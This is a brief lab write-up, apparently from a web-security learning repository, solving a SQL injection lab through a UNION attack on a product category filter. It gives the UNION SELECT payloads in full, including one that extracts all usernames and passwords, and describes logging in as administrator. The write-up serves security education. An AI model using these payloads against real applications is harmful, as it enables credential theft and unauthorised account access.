This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

> We used the payload 'UNION+SELECT+NULL,'a'--

> Here only the second column returns the text data. Now used the payload 'UNION+SELECT+NULL,username||'~'||password+FROM+users-- to

![image](https://github.com/udayk01/Web-Security/assets/52235763/24755c2c-4c55-4829-bba1-8375d5b44e02)

![image](https://github.com/udayk01/Web-Security/assets/52235763/7f27a371-2dd6-4e79-9adb-78378d9fdb70)

> Tried signing in with the username and password.

![image](https://github.com/udayk01/Web-Security/assets/52235763/051254f8-1c47-4528-83a3-4097267b23a3)

> Successfully logged in

![image](https://github.com/udayk01/Web-Security/assets/52235763/48b77464-1493-49b6-a705-8a6e7344d3e4)

